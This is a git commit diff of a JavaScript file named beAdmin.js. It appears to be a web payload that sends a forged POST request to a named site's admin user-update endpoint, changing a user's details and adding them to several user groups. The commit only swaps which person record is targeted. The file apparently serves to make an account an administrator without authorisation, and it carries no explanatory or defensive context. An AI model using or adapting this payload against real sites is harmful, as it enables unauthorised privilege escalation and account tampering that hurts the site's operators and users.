ef45c1866501b0e9e2ae204298601a536c4ade98
tomoncrss <tonymyson89823@gmail.com>
2025-02-14 12:03:11 +0330

    Update beAdmin.js

--- beAdmin.js
+++ beAdmin.js
@@ -1,5 +1,5 @@
 fetch("https://refeng.erad.com/Admin/AdminUsers/UpdateUserDetails", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `PersonKey=25798&LastName=staffian&FirstName=staff&GenderCode=M&EmailAddress=tastethetastytest%2Bstaff%40gmail.com&user_groups=110&user_groups=119&user_groups=120&multiselect=multiselect-all&multiselect=110&multiselect=119&multiselect=120`
+        body: `PersonKey=25692&LastName=aa&FirstName=aa&GenderCode=M&user_groups=110&user_groups=119&user_groups=120&multiselect=110&multiselect=119&multiselect=120`
       });
